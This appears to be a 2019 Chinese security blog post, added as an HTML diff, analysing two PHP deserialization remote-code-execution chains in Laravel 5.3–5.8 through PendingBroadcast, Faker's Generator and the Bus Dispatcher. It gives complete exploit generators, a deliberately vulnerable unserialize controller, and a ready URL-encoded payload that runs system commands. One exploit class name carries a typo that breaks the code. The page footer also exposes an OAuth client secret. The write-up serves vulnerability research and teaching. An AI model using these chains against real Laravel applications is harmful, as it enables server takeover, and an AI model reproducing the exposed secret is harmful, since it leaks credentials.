@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            Laravel由destrcuct引起的两处反序列化RCE分析
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/"> 
+                    Laravel由destrcuct引起的两处反序列化RCE分析 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-08-25   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Laravel由destrcuct引起的两处反序列化RCE分析"><span class="toc-list-text">Laravel由destrcuct引起的两处反序列化RCE分析</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Laravel自加载组件fzaninotto组件RCE"><span class="toc-list-text">Laravel自加载组件fzaninotto组件RCE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#版本说明"><span class="toc-list-text">版本说明</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#适用条件"><span class="toc-list-text">适用条件</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#漏洞复现"><span class="toc-list-text">漏洞复现</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#环境搭建"><span class="toc-list-text">环境搭建</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#漏洞复现-1"><span class="toc-list-text">漏洞复现</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#EXP"><span class="toc-list-text">EXP</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#EXP流程"><span class="toc-list-text">EXP流程</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Dispatcher处存在任意函数调用"><span class="toc-list-text">Dispatcher处存在任意函数调用</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p>
+<p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p>
+<h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p>
+<p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p>
+<p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p>
+<h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul>
+<li>laravel 5.3-5.8</li>
+<li>寻找可控的反序列化点，才能触发该漏洞</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p>
+<p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p>
+<pre><code>&lt;?php
+namespace App\Http\Controllers;
+
+class TaskController
+{
+    public function index(){
+        unserialize($_GET[&#39;url&#39;]);
+    }
+}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p>
+<pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php
+//exp.php
+namespace Faker{
+    class Generator{
+        protected $formatters = array();
+
+        public function __construct($formatters)
+        {
+            $this-&gt;formatters = $formatters;
+        }
+    }
+}
+
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast.php``
+    {
+        protected $events;
+        protected $event;
+
+        public function __construct($events, $event)
+        {
+            $this-&gt;events = $events;
+            $this-&gt;event = $event;
+        }
+
+    }
+}
+
+namespace{
+    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));
+    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);
+    echo urlencode(serialize($PendingBroadcast));
+
+}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p>
+<pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p>
+<h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p>
+<p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p>
+<p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p>
+<p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p>
+<p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p>
+<p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p>
+<p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p>
+<p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p>
+<p>继续步入看看getFormatter函数的具体实现</p>
+<pre><code>public function getFormatter($formatter) # formatter  = dispatch
+{
+    if (isset($this-&gt;formatters[$formatter])) { # formatters可控
+        return $this-&gt;formatters[$formatter];
+    }
+    foreach ($this-&gt;providers as $provider) {
+        if (method_exists($provider, $formatter)) {
+            $this-&gt;formatters[$formatter] = array($provider, $formatter);
+
+            return $this-&gt;formatters[$formatter];
+        }
+    }
+    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
+}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p>
+<h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p>
+<p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p>
+<p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p>
+<p>这里首先进行了如下条件判断</p>
+<pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p>
+<p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p>
+<p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p>
+<p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p>
+<p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p>
+<pre><code>&lt;?php
+
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast
+    {
+        protected $events;
+        protected $event;
+
+        public function __construct($events, $event)
+        {
+            $this-&gt;events = $events;
+            $this-&gt;event = $event;
+        }
+
+    }
+
+    class BroadcastEvent
+    {
+      protected $connection;
+
+      public function __construct($connection)
+      {
+        $this-&gt;connection = $connection;
+      }
+    }
+
+}
+
+namespace Illuminate\Bus{
+    class Dispatcher{
+        protected $queueResolver;
+
+        public function __construct($queueResolver)
+        {
+          $this-&gt;queueResolver = $queueResolver;
+        }
+
+    }
+}
+
+namespace{
+    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);
+
+    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);
+
+    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
+
+    echo urlencode(serialize($PendingBroadcast));
+
+}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">https://hpdoger.cn/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/"> 从一次漏洞挖掘入门ldap注入 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Sun Aug 25 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
